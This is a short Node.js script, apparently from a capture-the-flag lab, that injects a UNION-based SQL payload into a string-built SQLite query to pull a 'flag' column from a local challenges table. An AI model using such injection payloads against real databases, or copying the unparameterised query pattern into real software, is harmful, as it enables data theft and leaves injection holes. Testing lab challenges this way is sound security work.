const sqlite3 = require('sqlite3');
const db = new sqlite3.Database('./actlab.db');
const q = "test' UNION SELECT 1,flag,3,4,5,6,7,8 FROM challenges --";
const query = `SELECT id, title, description, category, difficulty, hint, points, endpoint FROM challenges WHERE title LIKE '%${q}%' OR description LIKE '%${q}%'`;
console.log("Query:", query);
db.all(query, (err, rows) => {
    console.log("Error:", err);
    console.log("Rows:", rows);
});
